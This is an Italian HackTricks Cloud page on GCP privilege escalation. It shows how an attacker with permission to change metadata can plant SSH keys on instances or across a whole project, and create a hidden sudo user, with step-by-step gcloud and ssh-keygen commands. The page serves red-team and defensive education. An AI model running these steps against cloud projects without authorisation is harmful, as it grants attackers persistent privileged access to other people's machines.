# GCP - Aggiungere Metadati SSH Personalizzati

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Modifica dei metadati <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

La modifica dei metadati su un'istanza potrebbe comportare **significativi rischi per la sicurezza se un attaccante acquisisce le autorizzazioni necessarie**.

### **Incorporazione delle Chiavi SSH nei Metadati Personalizzati**

Su GCP, i **sistemi Linux** eseguono spesso script dall'[Ambiente Guest Linux Python per Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Un componente critico di questo √® il [daemon degli account](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), progettato per **controllare regolarmente** il punto finale dei metadati dell'istanza per **aggiornamenti delle chiavi pubbliche SSH autorizzate**.

Pertanto, se un attaccante pu√≤ modificare i metadati personalizzati, potrebbe far s√¨ che il daemon trovi una nuova chiave pubblica, che verr√† elaborata e **integrata nel sistema locale**. La chiave verr√† aggiunta nel file `~/.ssh/authorized_keys` di un **utente esistente o potenzialmente creando un nuovo utente con privilegi `sudo`**, a seconda del formato della chiave. E l'attaccante sar√† in grado di compromettere l'host.

### **Aggiungere una chiave SSH a un utente privilegiato esistente**

1. **Esaminare le Chiavi SSH Esistenti sull'Istanza:**
- Esegui il comando per descrivere l'istanza e i suoi metadati per individuare le chiavi SSH esistenti. La sezione rilevante nell'output sar√† sotto `metadata`, in particolare la chiave `ssh-keys`.
```bash
gcloud compute instances describe [ISTANZA] --zone [ZONA]
```
- Presta attenzione al formato delle chiavi SSH: il nome utente precede la chiave, separato da due punti.

2. **Prepara un File di Testo per i Metadati delle Chiavi SSH:**
- Salva i dettagli dei nomi utente e delle relative chiavi SSH in un file di testo chiamato `meta.txt`. Questo √® essenziale per preservare le chiavi esistenti mentre se ne aggiungono di nuove.

3. **Genera una Nuova Chiave SSH per l'Utente Target (`alice` in questo esempio):**
- Usa il comando `ssh-keygen` per generare una nuova chiave SSH, assicurandoti che il campo commento (`-C`) corrisponda al nome utente target.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Aggiungi la nuova chiave pubblica a `meta.txt`, imitando il formato trovato nei metadati dell'istanza.

4. **Aggiorna i Metadati delle Chiavi SSH dell'Istanza:**
- Applica i metadati delle chiavi SSH aggiornati all'istanza usando il comando `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [ISTANZA] --metadata-from-file ssh-keys=meta.txt
```

5. **Accedi all'Istanza Utilizzando la Nuova Chiave SSH:**
- Connettiti all'istanza con SSH utilizzando la nuova chiave, accedendo alla shell nel contesto dell'utente target (`alice` in questo esempio).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Creare un nuovo utente privilegiato e aggiungere una chiave SSH**

Se non viene trovato alcun utente interessante, √® possibile crearne uno nuovo a cui verranno dati privilegi `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Chiavi SSH a livello di progetto <a href="#sshing-around" id="sshing-around"></a>

√à possibile ampliare la portata dell'accesso SSH a pi√π Macchine Virtuali (VM) in un ambiente cloud **applicando chiavi SSH a livello di progetto**. Questo approccio consente l'accesso SSH a qualsiasi istanza all'interno del progetto che non abbia esplicitamente bloccato le chiavi SSH a livello di progetto. Ecco una guida riassuntiva:

1. **Applica le Chiavi SSH a Livello di Progetto:**
- Utilizza il comando `gcloud compute project-info add-metadata` per aggiungere le chiavi SSH da `meta.txt` ai metadati del progetto. Questa azione garantisce che le chiavi SSH siano riconosciute su tutte le VM nel progetto, a meno che una VM abbia abilitato l'opzione "Blocca le chiavi SSH a livello di progetto".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Accedi alle Istanze Utilizzando le Chiavi a Livello di Progetto:**
- Con le chiavi SSH a livello di progetto in posizione, puoi accedere via SSH a qualsiasi istanza all'interno del progetto. Le istanze che non bloccano le chiavi a livello di progetto accetteranno la chiave SSH, concedendo l'accesso.
- Un metodo diretto per accedere via SSH a un'istanza √® utilizzare il comando `gcloud compute ssh [ISTANZA]`. Questo comando utilizza il tuo nome utente attuale e le chiavi SSH impostate a livello di progetto per tentare l'accesso.


# Riferimenti
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
